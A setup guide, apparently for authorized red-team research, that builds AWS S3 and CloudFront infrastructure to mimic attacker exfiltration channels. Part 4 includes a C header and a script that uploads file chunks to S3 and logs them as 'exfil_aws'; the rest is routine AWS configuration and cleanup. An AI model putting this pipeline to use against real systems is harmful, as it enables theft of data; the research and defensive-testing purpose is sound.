# AWS CDN Setup for JOCKY Research Chain

**Authorized Testing** - Red Hat + IIT Bombay Cyber Security Team  
**Scope**: Authorized research and defense validation  
**Date**: 2026-09-28

---

## Overview

This guide sets up AWS infrastructure for the JOCKY research chain to simulate real-world attack exfiltration patterns. The setup uses S3 for storage and CloudFront for distribution, matching actual attacker infrastructure.

---

## Part 1: AWS Credential Setup

### 1.1 Create IAM User (Dedicated for Research)

```bash
# Create IAM user for research (DO NOT use root credentials)
aws iam create-user --user-name jocky-research-user

# Create access key
aws iam create-access-key --user-name jocky-research-user

# Output:
# {
#   "AccessKeyId": "AKIA...",
#   "SecretAccessKey": "wJalr...",
#   "UserName": "jocky-research-user"
# }

# Save to secure location
cat > ~/.aws/jocky-research-creds.json << 'EOF'
{
  "access_key_id": "AKIA...",
  "secret_access_key": "wJalr...",
  "region": "us-east-1",
  "user": "jocky-research-user"
}
EOF

chmod 600 ~/.aws/jocky-research-creds.json
```

### 1.2 Create IAM Policy (Least Privilege)

```bash
# Create policy for S3 + CloudFront access only
cat > /tmp/jocky-research-policy.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "S3ReadWrite",
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:PutObject",
        "s3:DeleteObject",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::jocky-research-data",
        "arn:aws:s3:::jocky-research-data/*"
      ]
    },
    {
      "Sid": "CloudFrontInvalidate",
      "Effect": "Allow",
      "Action": [
        "cloudfront:CreateInvalidation",
        "cloudfront:GetInvalidation"
      ],
      "Resource": "arn:aws:cloudfront::ACCOUNT_ID:distribution/DISTRIBUTION_ID"
    }
  ]
}
EOF

# Attach policy to user
aws iam put-user-policy \
  --user-name jocky-research-user \
  --policy-name JockyResearchPolicy \
  --policy-document file:///tmp/jocky-research-policy.json
```

### 1.3 Set Up AWS CLI Credentials

```bash
# Configure AWS CLI with research credentials
aws configure --profile jocky-research

# When prompted:
# AWS Access Key ID: AKIA...
# AWS Secret Access Key: wJalr...
# Default region: us-east-1
# Default output format: json

# Verify setup
aws s3 ls --profile jocky-research
```

---

## Part 2: S3 Bucket Configuration

### 2.1 Create S3 Bucket

```bash
# Create bucket (bucket names must be globally unique)
aws s3api create-bucket \
  --bucket jocky-research-data-$(date +%s) \
  --region us-east-1 \
  --profile jocky-research

# Store bucket name
BUCKET_NAME="jocky-research-data-1727534400"

# Enable versioning (for audit trail)
aws s3api put-bucket-versioning \
  --bucket $BUCKET_NAME \
  --versioning-configuration Status=Enabled \
  --profile jocky-research

# Enable encryption (AES-256)
aws s3api put-bucket-encryption \
  --bucket $BUCKET_NAME \
  --server-side-encryption-configuration '{
    "Rules": [{
      "ApplyServerSideEncryptionByDefault": {
        "SSEAlgorithm": "AES256"
      }
    }]
  }' \
  --profile jocky-research
```

### 2.2 Block Public Access (for security)

```bash
# Block all public access to bucket
aws s3api put-public-access-block \
  --bucket $BUCKET_NAME \
  --public-access-block-configuration \
  "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true" \
  --profile jocky-research
```

### 2.3 Configure Lifecycle Policy (Auto-cleanup)

```bash
# Auto-delete data after 30 days (research only)
cat > /tmp/lifecycle.json << 'EOF'
{
  "Rules": [
    {
      "Id": "DeleteAfter30Days",
      "Status": "Enabled",
      "Expiration": {
        "Days": 30
      }
    }
  ]
}
EOF

aws s3api put-bucket-lifecycle-configuration \
  --bucket $BUCKET_NAME \
  --lifecycle-configuration file:///tmp/lifecycle.json \
  --profile jocky-research
```

---

## Part 3: CloudFront Distribution Setup

### 3.1 Create CloudFront Distribution

```bash
# Create CloudFront distribution config
cat > /tmp/cloudfront-config.json << 'EOF'
{
  "CallerReference": "jocky-research-cf",
  "Comment": "Research CDN for JOCKY",
  "DefaultRootObject": "index.html",
  "Origins": {
    "Quantity": 1,
    "Items": [
      {
        "Id": "S3Origin",
        "DomainName": "jocky-research-data-TIMESTAMP.s3.amazonaws.com",
        "S3OriginConfig": {
          "OriginAccessIdentity": ""
        }
      }
    ]
  },
  "DefaultCacheBehavior": {
    "TargetOriginId": "S3Origin",
    "ViewerProtocolPolicy": "https-only",
    "TrustedSigners": {
      "Enabled": false,
      "Quantity": 0
    },
    "ForwardedValues": {
      "QueryString": false,
      "Cookies": {
        "Forward": "none"
      }
    },
    "MinTTL": 0,
    "DefaultTTL": 86400,
    "MaxTTL": 31536000
  },
  "Enabled": true,
  "PriceClass": "PriceClass_100"
}
EOF

# Create distribution
aws cloudfront create-distribution \
  --distribution-config file:///tmp/cloudfront-config.json \
  --profile jocky-research
```

### 3.2 Get CloudFront Domain

```bash
# List distributions
aws cloudfront list-distributions --profile jocky-research

# Extract domain (example output):
# d1234567890abcd.cloudfront.net

# Save for JOCKY config
export CLOUDFRONT_DOMAIN="d1234567890abcd.cloudfront.net"
```

---

## Part 4: JOCKY Integration

### 4.1 AWS Configuration in JOCKY

Create file: `src/runtime/aws/jocky_aws.h`

```c
#ifndef JOCKY_AWS_H
#define JOCKY_AWS_H

#include <stdint.h>

/* AWS S3 credentials */
typedef struct {
    const char* access_key_id;
    const char* secret_access_key;
    const char* region;
    const char* bucket_name;
} JOCKY_AWS_CREDS;

/* CloudFront distribution */
typedef struct {
    const char* domain_name;
    const char* distribution_id;
} JOCKY_CLOUDFRONT_CONFIG;

/* Initialize AWS connection */
int jocky_aws_init(
    const JOCKY_AWS_CREDS* creds,
    const JOCKY_CLOUDFRONT_CONFIG* cf_config);

/* Upload data to S3 */
int jocky_aws_s3_put_object(
    const char* key,
    const void* data,
    uint32_t data_size);

/* Get signed CloudFront URL */
int jocky_aws_cloudfront_get_signed_url(
    const char* object_key,
    uint32_t expires_seconds,
    char* out_url);

/* Download from S3 (for verification) */
int jocky_aws_s3_get_object(
    const char* key,
    void** out_data,
    uint32_t* out_size);

/* List objects in bucket */
int jocky_aws_s3_list_objects(
    const char* prefix,
    char** out_keys,
    uint32_t* out_count);

/* Delete object from S3 */
int jocky_aws_s3_delete_object(const char* key);

/* Shutdown AWS connection */
int jocky_aws_shutdown(void);

#endif
```

### 4.2 JOCKY Script Integration

Update `examples/research_chain_complete.jky`:

```jocky
use jocky.runtime
use jocky.aws

const AWS_ACCESS_KEY = "AKIA..."
const AWS_SECRET_KEY = "wJalr..."
const AWS_REGION = "us-east-1"
const AWS_BUCKET = "jocky-research-data-1727534400"
const CLOUDFRONT_DOMAIN = "d1234567890abcd.cloudfront.net"

fn initialize_aws() {
    println("[*] Initializing AWS S3 + CloudFront...")
    
    let result = jocky_aws_init(
        AWS_ACCESS_KEY,
        AWS_SECRET_KEY,
        AWS_REGION,
        AWS_BUCKET,
        CLOUDFRONT_DOMAIN
    )
    
    if result == 0 {
        println("[+] AWS connection established")
    } else {
        println("[!] AWS initialization failed")
    }
}

fn upload_to_aws(file_path: str, data: [u8], chunk_num: i32) {
    println("  [*] Uploading to AWS S3: " + file_path)
    
    let s3_key = "research/chunks/" + file_path + "_" + string(chunk_num)
    
    let upload_result = jocky_aws_s3_put_object(s3_key, data)
    
    if upload_result == 0 {
        println("    [+] S3 upload successful")
        
        // Get signed CloudFront URL
        let cf_url = jocky_aws_cloudfront_get_signed_url(s3_key, 3600)
        println("    [+] CloudFront URL: " + cf_url)
        
        audit_log("exfil_aws", "s3_upload", file_path, "success")
    } else {
        println("    [!] S3 upload failed")
    }
}

fn verify_aws_upload(file_path: str) {
    println("[*] Verifying AWS uploads...")
    
    // List objects in research/ prefix
    let objects = jocky_aws_s3_list_objects("research/chunks/")
    
    println("[+] Objects in S3: " + string(array_len(objects)))
    for obj in objects {
        println("  - " + obj)
    }
}
```

---

## Part 5: Testing & Verification

### 5.1 Test Upload

```bash
# Upload test file to S3
aws s3 cp test-data.bin s3://jocky-research-data-1727534400/test/ \
  --profile jocky-research

# List bucket contents
aws s3 ls s3://jocky-research-data-1727534400/ \
  --profile jocky-research --recursive

# Get file info
aws s3api head-object \
  --bucket jocky-research-data-1727534400 \
  --key test/test-data.bin \
  --profile jocky-research
```

### 5.2 Generate Signed CloudFront URLs

```bash
# Install signing tool
pip3 install awscli-plugin-cloudfront

# Create signed URL (valid 1 hour)
aws cloudfront sign \
  --distribution-id E1234567890ABC \
  --private-key ~/cloudfront-key.pem \
  --key-pair-id K1234567890ABC \
  --expires $(($(date +%s) + 3600)) \
  --file-path /research/data/file.bin \
  --domain-name d1234567890abcd.cloudfront.net
```

### 5.3 Monitor Uploads

```bash
# Watch S3 bucket for uploads
watch -n 5 'aws s3 ls s3://jocky-research-data-1727534400/ \
  --profile jocky-research --recursive | tail -20'

# Get CloudWatch metrics
aws cloudwatch get-metric-statistics \
  --namespace AWS/S3 \
  --metric-name NumberOfObjects \
  --dimensions Name=BucketName,Value=jocky-research-data-1727534400 \
  --start-time 2026-09-28T00:00:00Z \
  --end-time 2026-09-28T23:59:59Z \
  --period 3600 \
  --statistics Sum \
  --profile jocky-research
```

---

## Part 6: Security & Cleanup

### 6.1 Enable CloudTrail Logging (for audit)

```bash
# Create S3 bucket for CloudTrail logs
aws s3api create-bucket \
  --bucket jocky-research-cloudtrail-logs-$(date +%s) \
  --region us-east-1 \
  --profile jocky-research

# Enable CloudTrail
aws cloudtrail create-trail \
  --name jocky-research-trail \
  --s3-bucket-name jocky-research-cloudtrail-logs-1727534400 \
  --is-multi-region-trail \
  --profile jocky-research
```

### 6.2 Post-Research Cleanup

```bash
# Delete all objects in bucket
aws s3 rm s3://jocky-research-data-1727534400/ \
  --recursive \
  --profile jocky-research

# Disable CloudFront distribution
aws cloudfront update-distribution \
  --id E1234567890ABC \
  --distribution-config file:///tmp/cf-disabled.json \
  --profile jocky-research

# Delete bucket
aws s3api delete-bucket \
  --bucket jocky-research-data-1727534400 \
  --region us-east-1 \
  --profile jocky-research

# Delete IAM user and access keys
aws iam delete-access-key \
  --user-name jocky-research-user \
  --access-key-id AKIA... \
  --profile jocky-research

aws iam delete-user \
  --user-name jocky-research-user \
  --profile jocky-research
```

### 6.3 Verify Cleanup

```bash
# Check no resources remain
aws s3 ls --profile jocky-research
aws iam list-users --profile jocky-research
aws cloudfront list-distributions --profile jocky-research
```

---

## Part 7: Cost Estimation

| Service | Usage | Est. Cost |
|---------|-------|-----------|
| S3 Storage | 10 GB / month | $0.23 |
| S3 Requests | 10K uploads | $0.50 |
| CloudFront | 100 GB transfer | $8.50 |
| CloudTrail | 1M events | $2.00 |
| **Total** | **1 month** | **~$11/month** |

---

## Summary

**AWS Setup Provides**:
- ✅ Real-world CDN simulation
- ✅ Encrypted S3 storage
- ✅ CloudFront distribution
- ✅ Signed URL support
- ✅ CloudTrail audit logging
- ✅ Cost-effective (~$11/month for research)

**Key Points**:
- Use dedicated IAM user (least privilege)
- Enable encryption and versioning
- Monitor CloudTrail for activity
- Auto-cleanup after 30 days
- Suitable for authorized research only

**Next**: Integrate AWS credentials into JOCKY script and test upload/download cycle.

---

**Authorization**: Red Hat + IIT Bombay Cyber Security Team  
**Scope**: Authorized testing and defense research  
**Status**: Ready for implementation
